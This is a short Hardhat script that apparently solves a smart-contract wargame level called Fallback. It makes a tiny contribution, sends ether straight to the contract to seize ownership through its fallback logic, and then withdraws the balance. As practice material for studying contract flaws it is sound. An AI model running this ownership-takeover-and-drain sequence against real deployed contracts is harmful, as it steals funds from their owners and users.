const path = require('path');
const addresses = require('../Addresses.json')

async function main() {
    const scriptName = path.basename(__filename, '.js');
    console.log('----------', scriptName, '----------')

    const accounts = await ethers.getSigners();
    const sender = accounts[0];
    
    const fallbackAddress = addresses[scriptName];
    const fallbackContract = await ethers.getContractAt("IFallback", fallbackAddress);

    const txContribute = await fallbackContract.contribute({value: 1})
    const txContractClaim = await sender.sendTransaction({to: fallbackAddress, value: 1})
    const txWithdraw = await fallbackContract.withdraw();

    console.log('----------End----------');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
